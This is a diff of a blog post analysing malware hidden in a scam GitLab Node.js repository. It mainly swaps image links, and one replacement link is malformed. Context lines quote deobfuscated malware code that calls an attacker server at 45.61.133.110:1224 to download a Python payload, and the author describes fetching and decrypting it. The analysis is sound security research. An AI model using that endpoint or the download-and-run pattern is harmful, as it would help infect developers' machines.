@@ -2,7 +2,7 @@
 title: Malicious Gitlab Repository
 published: 2025-06-11
 description: 'Explore and analyse a scam repository on Gitlab'
-image: 'https://hackmd.io/_uploads/BJw4HyPmle.png'
+image: ./wrapper.png
 tags: [malware, misc]
 category: 'write-up'
 draft: false 
@@ -23,7 +23,7 @@ Below, I’ll briefly go over the steps shown in the video by Manh Tuan.
 
 
 1. In the ```/api/app.js``` file, it calls the ```initAppBootstrap()``` function.
-![{BB380DF1-6C0B-4079-AD43-2ECA163DA9D7}](https://hackmd.io/_uploads/B1UhwkwXgl.png)
+![{BB380DF1-6C0B-4079-AD43-2ECA163DA9D7}](./part_of_file.png)
 
 2. Inside `bootstrap.js`, we encounter the following code:
     ```javascript
@@ -56,7 +56,7 @@ Below, I’ll briefly go over the steps shown in the video by Manh Tuan.
     ```
 
 4. Notice that the Axios code sets the header ```k``` with the value ```v```. After making the request and dumping the result into the file ```res.js```, we obtain:
-![{D41B5BF2-2616-47F8-8CAD-384AE4225A9F}](https://hackmd.io/_uploads/S1Jut1DXll.png)
+![{D41B5BF2-2616-47F8-8CAD-384AE4225A9F}](./res.png)
 Something went crazy at this point—and now, this is the main goal of our write-up 😐. (Nah, maybe silly when I dont setup VM to test it 🤷‍♂️).
 
 :::important
@@ -197,7 +197,7 @@ After copying the entire content of the response file, I went to this link to be
 
 However, it seems like the tool only managed to beautify and partially untangle the code—and that was actually the best result I got after wandering through every deobfuscation tool I could find. Below is a part of file:
 
-![A part of file](https://hackmd.io/_uploads/Sk_e6kvQxe.png)
+![A part of file](./image_1.png)
 
 ## Quick look
 
@@ -638,7 +638,7 @@ Based on what I can tell, this seems to be the part where the code patches itsel
 Could this be a typo?
 
 Update (12/06/2025): All of my previous assumptions were completely wrong. This isn’t where the malware is patched — it’s actually where they download the Python environment to the victim’s machine (quite meticulous, actually). This is a preparation step for executing the ```.py``` payload later on — probably because they couldn’t be sure whether a Node.js developer would already have Python installed.
-![{29876A88-0AB3-40C1-BAFE-91673BEC625C}](https://hackmd.io/_uploads/SJUuKPdXle.png)
+![{29876A88-0AB3-40C1-BAFE-91673BEC625C}](./python.png)
 
 <hr style="border: none; border-top: 1px solid #ccc;">
 
@@ -678,7 +678,7 @@ const Xt = async () => await new Promise((_0x9056d6, _0x5fd84b) => {
   });
 ```
 This's really interesting: ```request.get("http://45.61.133.110:1224/client/106/81", (_0x311f89, _0x5ca69e, _0x5b32ee)```. Can’t wait any longer — let’s send a GET request to this endpoint and see what we get. Boom, we got ```main106_81.py```.
-![{08FB7192-BE6D-4004-BA26-2D07CE955EC0}](https://hackmd.io/_uploads/BJbzkWDQxg.png)
+![{08FB7192-BE6D-4004-BA26-2D07CE955EC0}](./pyob.png)
 At here, we need some scripting to decrypt it. This is the code I used:
 ```python
 for i in range(100):
@@ -868,11 +868,11 @@ And at this point, it’s clear — the content of the main function confirms ev
 
 And now you might be asking: so where’s the rest of the code? Does it serve any purpose? The answer is: yes, it does. After some research, I found they are anti-debugger and regex bomb:
 
-![{F349BFC5-3014-4AA6-80E6-28ADA57BF360}](https://hackmd.io/_uploads/H1deubPQex.png)
+![{F349BFC5-3014-4AA6-80E6-28ADA57BF360}](./image_2.png)
 
 and, 
 
-![{76381EBF-A6C8-477F-9692-667995671E4E}](https://hackmd.io/_uploads/SJY-dZwmgg.png)
+![{76381EBF-A6C8-477F-9692-667995671E4E}](![alt text](./image_3.png))
 
 # Conclusion
 And with that, we’ve reached the end of this write-up.
@@ -882,7 +882,7 @@ I’ll upload the full code to my Github.
 ::github{repo="VuxNx/REPO_SCAM_WU"}
 
 P/S: Up to this point, the attacker has only changed the attack server. This explains the confusion I had yesterday while writing the write-up: why the obfuscated JS call link was still alive even though the server was down. You can easily find the new server by applying the same analysis method I used above (12/06/2025).
-![{6A238C36-8500-4A60-B9C3-5E5556BE8372}](https://hackmd.io/_uploads/HyO0x0D7ll.png)
+![{6A238C36-8500-4A60-B9C3-5E5556BE8372}](./image_4.png)
 
 :::note
 My original write-up on HackMD:  [REPO SCAM WRITE-UP](https://hackmd.io/@VuxNx/rJXcyJwmel)
